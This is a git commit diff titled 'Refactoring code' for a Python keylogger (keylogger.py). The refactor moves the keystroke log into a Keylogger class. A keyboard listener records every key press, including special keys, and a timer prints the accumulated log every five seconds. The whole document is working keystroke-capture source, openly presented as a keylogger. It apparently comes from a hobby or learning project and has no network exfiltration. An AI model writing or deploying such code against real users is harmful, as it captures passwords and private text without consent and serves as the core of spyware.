f04d3dc899cff13d53a2e38d74a67935312342e0
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-03 12:51:29 +0530

    Refactoring code

--- keylogger.py
+++ keylogger.py
@@ -4,20 +4,26 @@ import threading
 log = ""
 
 class Keylogger:
+    def __init__(self):
+        self.log = ""
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
     def process_key_press(self, key):
-        global log
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
+
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = " "
             else:
-                log = log + " " + str(key) + " "
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
     def report(self):
-        global log
-        print(log)
-        log = " "
+        print(self.log)
+        self.log = " "
         timer = threading.Timer(5, self.report)
         timer.start()
 
@@ -26,4 +32,5 @@ class Keylogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()    # starting the listener
+
 
